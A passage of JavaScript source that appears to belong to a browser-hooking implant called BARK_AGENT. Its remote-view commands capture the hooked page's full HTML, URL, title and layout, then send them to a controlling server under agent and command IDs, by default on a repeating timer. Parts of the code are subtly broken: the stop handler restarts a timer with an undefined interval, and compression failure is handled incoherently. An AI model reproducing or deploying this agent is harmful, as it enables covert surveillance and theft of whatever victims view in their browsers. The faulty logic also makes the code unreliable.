                        const compressedBytes = pako.gzip(html);

                        const base64Encoded = btoa(
                            // Convert the Uint8Array to a binary string
                            Array.from(new Uint8Array(compressedBytes))
                                .map(byte => String.fromCharCode(byte))
                                .join('')
                        );

                        html = base64Encoded;
                    } catch (e) {  
                        const script = document.createElement('script');
                        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/pako/2.1.0/pako.min.js';
                        script.onload = () => resolve(window.pako);
                        script.onerror = () => reject(new Error('Failed to load pako library'));
                        document.head.appendChild(script);
                    }
                    

                } catch (htmlError) {
                    Logger.error("Error capturing HTML:", htmlError);
                    html = "<html><body>Error capturing HTML content</body></html>";
                }
                
                return {
                    type: "remote_view_data",
                    title: document.title,
                    url: window.location.href,
                    html: html,
                    viewport: viewport,
                    computedStyles: computedStyles,
                    timestamp: new Date().toISOString()
                };
            } catch (e) {
                return { 
                    error: e.toString(),
                    url: window.location.href,
                    title: document.title || "Unknown"
                };
            }
        },
        
        "start": function(params) {
            try {
                // Default to 5 seconds if no interval specified
                const interval = params && params.length > 0 ? parseInt(params[0], 10) || 5000 : 5000;
                
                // Clear existing timer if there is one
                if (window._barkRemoteViewTimer) {
                    clearInterval(window._barkRemoteViewTimer);
                }
                
                // Store the command ID for consistent tracking - IMPORTANT: Use the original command ID
                window._barkRemoteViewCommandId = window._barkCurrentCommandId || "remote_view_session";
                
                // Store the agent reference safely for the interval
                const agent = BARK_AGENT;
                const self = this;
                
                // Start the remote view interval
                window._barkRemoteViewTimer = setInterval(() => {
                    try {
                        // Capture the current page content
                        const visualResult = self._captureDOM();
                        
                        // Send as a remote_view_result message for special handling in route.go
                        agent.sendMessage({
                            type: "remote_view_result", // Changed from command_result to match route.go handling
                            agentId: agent.agentId,
                            commandId: window._barkRemoteViewCommandId, // Use the stored command ID
                            timestamp: new Date().toISOString(),
                            result: visualResult
                        });
                    } catch (err) {
                        Logger.error("Error during remote view capture:", err);
                    }
                }, interval);
                
                return {
                    success: true,
                    message: `Remote view started with interval: ${interval}ms`,
                    commandId: window._barkRemoteViewCommandId // Include the commandId in the response
                };
            } catch (e) {
                return { 
                    error: e.toString(),
                    message: "Failed to start remote view" 
                };
            }
        },
        
        "stop": function(params) {
            try {
                if (window._barkRemoteViewTimer) {
                    clearInterval(window._barkRemoteViewTimer);
                    window._barkRemoteViewTimer = null;
                    
                    // Send a final message indicating the remote view has stopped
                    BARK_AGENT.sendMessage({
                        type: "command_result", // Use command_result for final status
                        agentId: BARK_AGENT.agentId,
                        commandId: window._barkRemoteViewCommandId || "remote_view_session",
                        timestamp: new Date().toISOString(),
                        result: {
                            type: "remote_view_stopped",
                            message: "Remote view monitoring stopped",
                            timestamp: new Date().toISOString()
                        },
                        success: true
                    });
                    

                    window._barkRemoteViewCommandId = null;

                    // Start the remote view interval
                    window._barkRemoteViewTimer = setInterval(() => {
                        const currentHTML = document.documentElement.outerHTML;
                        const currentURL = window.location.href;
                        const currentTitle = document.title;
                        
                        // Rewrite relative URLs to absolute URLs
                        const rewrittenHTML = Utils.rewriteURLs(currentHTML, currentURL);
                        
                        // Make sure we have access to the BARK_AGENT
                        if (window._barkRemoteViewAgent) {
                            window._barkRemoteViewAgent.sendMessage({
                                type: "remote_view_result",
                                agentId: window._barkRemoteViewAgent.agentId,
                                commandId: window._barkRemoteViewCommandId || "remote_view_" + Date.now(),
                                timestamp: new Date().toISOString(),
                                result: {
                                    html: rewrittenHTML.substring(0, 50000), // Limit size to avoid message issues
                                    url: currentURL,
                                    title: currentTitle,
                                    timestamp: new Date().toISOString()
                                },
                                success: true
                            });
                        }
                    }, interval);

                    
                    return {
                        success: true,
                        message: "Remote view stopped"
                    };
                } else {
                    return {
                        success: false,
                        message: "Remote view was not active"
                    };
                }
            } catch (e) {
                return { 
                    error: e.toString(),
                    message: "Error stopping remote view" 
                };
            }
        },
        
        "capture": function(params) {
            try {
                // Store the command ID
                window._barkCurrentCaptureId = window._barkCurrentCommandId || "remote_view_capture";
                
                // Capture the current state
                const captureData = this._captureDOM();
                
                // Send using remote_view_result type for special handling
                BARK_AGENT.sendMessage({
                    type: "remote_view_result", // Changed to match route.go handling
                    agentId: BARK_AGENT.agentId,
                    commandId: window._barkCurrentCaptureId,
                    timestamp: new Date().toISOString(),
                    result: captureData
                });
                
                return {
                    success: true,
                    message: "Remote view capture sent to server"
                };
            } catch (e) {
                return { 
                    error: e.toString(),
                    message: "Error capturing remote view" 
                };
            }
        }
    }
});

    BARK_AGENT.captureVisualLayout = function() {
        try {
            Logger.log("Capturing visual layout of the page");
            
            // Clone the current document to avoid modifying the actual DOM
            const docClone = document.cloneNode(true);
            
            // Remove all script tags from the clone to reduce size
            const scripts = docClone.querySelectorAll('script');
            scripts.forEach(script => {
                script.parentNode.removeChild(script);
            });
            
            // Also remove any large comment blocks that might contain minified code
            const removeComments = function(node) {
                const childNodes = node.childNodes;
                
                for (let i = childNodes.length - 1; i >= 0; i--) {
                    const child = childNodes[i];
                    
                    // Remove comment nodes
                    if (child.nodeType === 8) { // Node.COMMENT_NODE
                        node.removeChild(child);
                    } else if (child.nodeType === 1) { // Node.ELEMENT_NODE
                        removeComments(child);
                    }
                }
            };
            
            removeComments(docClone);
            
            
            // Extract key elements of the page that represent the visual structure
            const docHTML = docClone.documentElement.outerHTML;
            
            // Capture computed styles for key elements to ensure visual fidelity
            const styles = {};
            try {
                // Get styles for body and main layout containers
                const keyElements = ['body', 'main', '#main', '.main', 'header', 'footer', '.container', '#container'];
                keyElements.forEach(selector => {
                    const elements = document.querySelectorAll(selector);
                    if (elements.length) {
                        styles[selector] = {};
                        elements.forEach((element, index) => {
                            const computedStyle = window.getComputedStyle(element);
                            const elementStyles = {};
                            
                            // Grab key layout properties
                            ['width', 'height', 'display', 'position', 'flex', 'grid',
                             'margin', 'padding', 'color', 'background-color'].forEach(prop => {
                                elementStyles[prop] = computedStyle.getPropertyValue(prop);
                            });
                            
                            styles[selector][index] = elementStyles;
                        });
                    }
                });
            } catch (styleError) {
                Logger.error("Error capturing styles:", styleError);
            }
            
            // Capture current viewport dimensions
            const viewport = {
                width: window.innerWidth,
                height: window.innerHeight,
                scrollX: window.scrollX,
                scrollY: window.scrollY
            };
            
            // Get metadata about interactive elements
            const interactive = {
                links: document.querySelectorAll('a').length,
                buttons: document.querySelectorAll('button').length,
                forms: document.querySelectorAll('form').length,
                inputs: document.querySelectorAll('input, select, textarea').length
            };
            
            // Return comprehensive layout information
            return {
                success: true,
                title: document.title,
                url: window.location.href,
                html: docHTML,
                viewport: viewport,
                interactive: interactive,
                computedStyles: styles,
                timestamp: new Date().toISOString()
            };
        } catch (e) {
            Logger.error("Error capturing visual layout:", e);
            return { 
                error: e.toString(),
                url: window.location.href,
                title: document.title
            };
        }
    };
    
    // Initialize the agent
    BARK_AGENT.init();
})();